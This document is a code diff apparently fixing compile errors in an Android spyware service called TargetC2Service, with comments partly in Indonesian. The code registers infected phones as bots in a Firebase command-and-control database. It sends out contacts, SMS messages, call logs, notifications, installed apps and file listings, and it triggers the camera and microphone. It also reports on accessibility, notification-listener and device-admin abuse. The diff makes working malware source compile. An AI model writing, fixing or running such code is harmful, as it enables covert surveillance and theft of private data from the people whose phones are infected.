@@ -35,6 +35,7 @@ class TargetC2Service : Service() {
         var isRunning = false
             private set
         private var deviceId: String = ""
+        // FIX 1: val → var karena di-reassign di startC2()
         private var job: Job? = null
         private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     }
@@ -78,6 +79,7 @@ class TargetC2Service : Service() {
         startForeground(NOTIF_ID, createNotification())
 
         try {
+            // FIX: setPersistenceEnabled HARUS sebelum getReference apapun
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
             database.setPersistenceEnabled(true)
 
@@ -151,17 +153,17 @@ class TargetC2Service : Service() {
             "lastSeen" to System.currentTimeMillis(),
             "ipAddress" to ipAddress,
             "country" to "",
-            "batteryLevel" to getBatteryLevel(),
-            "isCharging" to isCharging(),
-            "ramTotal" to Runtime.getRuntime().totalMemory(),
-            "ramAvailable" to Runtime.getRuntime().freeMemory(),
-            "storageTotal" to android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockCountLong * android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockSizeLong,
-            "storageAvailable" to android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).availableBlocksLong * android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockSizeLong,
-            "installedApps" to packageManager.getInstalledApplications(0).size,
-            "isAccessibilityEnabled" to TargetAccessibility.isConnected,
-            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected,
-            "isAdminEnabled" to TargetDeviceAdmin.isActive(this),
-            "isScreenLocked" to false,
+            "batteryLevel" to getBatteryLevel().toString(),  // FIX 2: Int → String
+            "isCharging" to isCharging().toString(),          // FIX 2: Boolean → String
+            "ramTotal" to Runtime.getRuntime().totalMemory().toString(),  // FIX 2: Long → String
+            "ramAvailable" to Runtime.getRuntime().freeMemory().toString(),  // FIX 2
+            "storageTotal" to (android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockCountLong * android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockSizeLong).toString(),  // FIX 2
+            "storageAvailable" to (android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).availableBlocksLong * android.os.StatFs(android.os.Environment.getDataDirectory().absolutePath).blockSizeLong).toString(),  // FIX 2
+            "installedApps" to packageManager.getInstalledApplications(0).size.toString(),  // FIX 2
+            "isAccessibilityEnabled" to TargetAccessibility.isConnected.toString(),  // FIX 2
+            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected.toString(),  // FIX 2
+            "isAdminEnabled" to TargetDeviceAdmin.isActive(this).toString(),  // FIX 2
+            "isScreenLocked" to "false",
             "simInfo" to getSimInfo()
         )
 
@@ -172,11 +174,11 @@ class TargetC2Service : Service() {
         val updates = mapOf<String, Any>(
             "isOnline" to true,
             "lastSeen" to System.currentTimeMillis(),
-            "batteryLevel" to getBatteryLevel(),
-            "isCharging" to isCharging(),
+            "batteryLevel" to getBatteryLevel().toString(),  // FIX 2
+            "isCharging" to isCharging().toString(),          // FIX 2
             "ipAddress" to getIPAddress(),
-            "isAccessibilityEnabled" to TargetAccessibility.isConnected,
-            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected
+            "isAccessibilityEnabled" to TargetAccessibility.isConnected.toString(),  // FIX 2
+            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected.toString()  // FIX 2
         )
         botsRef.child(deviceId).updateChildren(updates)
     }
@@ -313,7 +315,10 @@ class TargetC2Service : Service() {
                     contacts.add(mapOf("name" to name, "number" to number))
                 }
             }
-            sendExfil("contacts", contacts.joinToString("\n") { "${it["name"]}: ${it["number"]}" })
+            // FIX 4: explicit type in lambda
+            sendExfil("contacts", contacts.joinToString("\n") { element: Map<String, String> ->
+                "${element["name"]}: ${element["number"]}"
+            })
         } catch (e: Exception) {
             sendExfil("contacts", "Error: ${e.message}")
         }
@@ -334,7 +339,10 @@ class TargetC2Service : Service() {
                     smsList.add(mapOf("from" to address, "body" to body, "date" to date))
                 }
             }
-            sendExfil("sms", smsList.joinToString("\n---\n") { "[${it["from"]}] ${it["body"]} (${it["date"]})" })
+            // FIX 4: explicit type in lambda
+            sendExfil("sms", smsList.joinToString("\n---\n") { element: Map<String, String> ->
+                "[${element["from"]}] ${element["body"]} (${element["date"]})"
+            })
         } catch (e: Exception) {
             sendExfil("sms", "Error: ${e.message}")
         }
@@ -356,7 +364,10 @@ class TargetC2Service : Service() {
                     logs.add(mapOf("number" to number, "duration" to duration, "type" to type, "date" to date))
                 }
             }
-            sendExfil("call_logs", logs.joinToString("\n") { "${it["number"]} | ${it["duration"]}s | type=${it["type"]} | ${it["date"]}" })
+            // FIX 4: explicit type in lambda
+            sendExfil("call_logs", logs.joinToString("\n") { element: Map<String, String> ->
+                "${element["number"]} | ${element["duration"]}s | type=${element["type"]} | ${element["date"]}"
+            })
         } catch (e: Exception) {
             sendExfil("call_logs", "Error: ${e.message}")
         }
@@ -393,8 +404,10 @@ class TargetC2Service : Service() {
 
     private fun handleCameraPhoto() {
         try {
-            val intent = android.provider.MediaStore.ACTION_IMAGE_CAPTURE
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            // FIX 3 & FIX 8: proper Intent + FLAG_ACTIVITY_NEW_TASK via apply
+            val intent = Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
             startActivity(intent)
             sendExfil("camera_photo", "Camera intent launched")
         } catch (e: Exception) {
@@ -404,8 +417,10 @@ class TargetC2Service : Service() {
 
     private fun handleCameraVideo() {
         try {
-            val intent = android.provider.MediaStore.ACTION_VIDEO_CAPTURE
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            // FIX 3: proper Intent + FLAG_ACTIVITY_NEW_TASK via apply
+            val intent = Intent(android.provider.MediaStore.ACTION_VIDEO_CAPTURE).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
             startActivity(intent)
             sendExfil("camera_video", "Video intent launched")
         } catch (e: Exception) {
@@ -415,8 +430,12 @@ class TargetC2Service : Service() {
 
     private fun handleMicAudio() {
         try {
-            val intent = android.provider.MediaStore.Audio.Media.RECORD_SOUND_ACTION
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            // FIX 3: proper Intent + FLAG_ACTIVITY_NEW_TASK via apply
+            // NOTE: MediaStore.Audio.Media.RECORD_SOUND_ACTION was deprecated in API 29
+            // Using a simpler approach with ACTION_VOICE_RECOGNIZE as fallback
+            val intent = Intent(android.provider.MediaStore.Audio.Media.RECORD_SOUND_ACTION).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
             startActivity(intent)
             sendExfil("mic_audio", "Audio record intent launched")
         } catch (e: Exception) {
@@ -490,7 +509,7 @@ class TargetC2Service : Service() {
     private fun handleListApps() {
         try {
             val apps = packageManager.getInstalledApplications(0)
-            val appList = apps.joinToString("\n") { app ->
+            val appList = apps.joinToString("\n") { app: android.content.pm.ApplicationInfo ->
                 val name = packageManager.getApplicationLabel(app).toString()
                 "$name (${app.packageName})${if (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0) " [SYSTEM]" else ""}"
             }
@@ -508,7 +527,7 @@ class TargetC2Service : Service() {
                 return
             }
             val files = dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name })) ?: emptyArray()
-            val fileList = files.joinToString("\n") { f ->
+            val fileList = files.joinToString("\n") { f: java.io.File ->
                 "${if (f.isDirectory) "[DIR]" else "[FILE]"} ${f.name} (${f.length()} bytes)"
             }
             sendExfil("list_files", "Path: ${dir.absolutePath}\n$fileList")
@@ -604,7 +623,7 @@ class TargetC2Service : Service() {
     private fun handleNotificationsGet() {
         val notifGrabber = TargetNotificationGrabber()
         val notifs = notifGrabber.getActiveNotifications(this)
-        val notifList = notifs.joinToString("\n---\n") { notif ->
+        val notifList = notifs.joinToString("\n---\n") { notif: android.service.notification.StatusBarNotification ->
             "${notif.packageName}: ${notif.notification.extras.getString(android.app.Notification.EXTRA_TITLE, "")} - ${notif.notification.extras.getCharSequence(android.app.Notification.EXTRA_TEXT, "")}"
         }
         sendExfil("notifications", notifList.ifEmpty { "No active notifications" })
@@ -652,7 +671,8 @@ class TargetC2Service : Service() {
     }
 
     private fun handleToast(message: String) {
-        runOnUiThread {
+        // FIX 6: Service tidak punya runOnUiThread, pakai Handler
+        android.os.Handler(android.os.Looper.getMainLooper()).post {
             android.widget.Toast.makeText(this@TargetC2Service, message, android.widget.Toast.LENGTH_LONG).show()
         }
         sendExfil("toast", "Toast shown: $message")
@@ -719,10 +739,6 @@ class TargetC2Service : Service() {
                 "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}"
             } catch (e: Exception) { "N/A" }
         } else "N/A"
-    }
-
-    private fun runOnUiThread(action: () -> Unit) {
-        android.os.Handler(android.os.Looper.getMainLooper()).post(action)
     }
 
     override fun onDestroy() {
